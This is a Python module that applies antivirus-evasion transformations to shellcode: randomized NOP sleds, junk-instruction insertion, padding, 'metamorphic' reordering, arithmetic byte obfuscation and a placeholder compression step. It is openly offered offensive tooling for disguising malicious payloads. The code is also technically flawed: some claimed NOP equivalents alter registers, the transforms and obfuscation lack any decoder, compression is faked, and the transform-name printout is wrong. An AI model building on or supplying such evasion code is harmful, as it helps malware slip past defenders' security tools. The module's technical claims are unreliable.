import random
from utils.validator import ShellcodeValidator
from typing import List

class EvasionTechniques:
    @staticmethod
    def apply(shellcode: bytes, techniques: List[str]) -> bytes:
        """Apply AV evasion techniques to shellcode with validation"""
        ShellcodeValidator.validate_shellcode(shellcode)
        
        print("\n[🛡️ Applying AV Evasion Techniques]")
        modified = shellcode
        
        for tech in techniques:
            if tech == "nopsled":
                modified = EvasionTechniques._add_nopsled(modified)
            elif tech == "junk":
                modified = EvasionTechniques._insert_junk_code(modified)
            elif tech == "padding":
                modified = EvasionTechniques._add_padding(modified)
            elif tech == "metamorphic" and len(modified) > 4:
                modified = EvasionTechniques._apply_metamorphic(modified)
            elif tech == "obfuscate":
                modified = EvasionTechniques._obfuscate(modified)
            elif tech == "compress":
                modified = EvasionTechniques._compress(modified)
                
        return modified

    @staticmethod
    def _add_nopsled(shellcode: bytes) -> bytes:
        """Add randomized NOP sled to shellcode"""
        nops = [b"\x90", b"\x4f", b"\x5f", b"\xeb\x02", b"\x66\x90"]  # Various NOP equivalents
        nopsled = b"".join(random.choice(nops) for _ in range(random.randint(32, 128)))
        print(f"  [+] Added {len(nopsled)} byte polymorphic NOP sled")
        return nopsled + shellcode

    @staticmethod
    def _insert_junk_code(shellcode: bytes) -> bytes:
        """Insert junk code into shellcode"""
        junk_ops = [
            b"\x50\x58",                     # push eax; pop eax
            b"\x51\x59",                     # push ecx; pop ecx
            b"\x31\xc0\x40",                 # xor eax,eax; inc eax
            b"\xeb\x02\x90",                 # jmp +2; nop
            b"\x8d\x40\x00"                  # lea eax,[eax+0x00]
        ]
        
        junk = random.choice(junk_ops)
        pos = random.randint(0, len(shellcode))
        print(f"  [+] Inserted {len(junk)} bytes of junk code at position {pos}")
        return shellcode[:pos] + junk + shellcode[pos:]

    @staticmethod
    def _add_padding(shellcode: bytes) -> bytes:
        """Add randomized padding to shellcode"""
        pad_sizes = [64, 128, 256, 512]
        pad_size = random.choice(pad_sizes)
        pad_char = random.choice([0xCC, 0x90, 0x00, 0xFF])
        pad = bytes([pad_char] * pad_size)
        print(f"  [+] Appended {pad_size} bytes of padding (0x{pad_char:02x})")
        return shellcode + pad

    @staticmethod
    def _apply_metamorphic(shellcode: bytes) -> bytes:
        """Apply metamorphic transformation"""
        transform_types = [
            lambda x: x[::-1],               # Reverse
            lambda x: x[::2] + x[1::2],      # Interleave
            lambda x: x[-4:] + x[:-4]        # Rotate
        ]
        
        transform = random.choice(transform_types)
        print(f"  [+] Applied metamorphic transform: {transform.__name__}")
        return transform(shellcode)

    @staticmethod
    def _obfuscate(shellcode: bytes) -> bytes:
        """Basic obfuscation by adding random arithmetic"""
        key = random.randint(1, 255)
        print(f"  [+] Applied arithmetic obfuscation with key 0x{key:02x}")
        return bytes((b + key) & 0xff for b in shellcode)

    @staticmethod
    def _compress(shellcode: bytes) -> bytes:
        """Compress shellcode (demonstration only)"""
        print("  [+] Applied compression (simulated)")
        return shellcode  # In real implementation, would use actual compression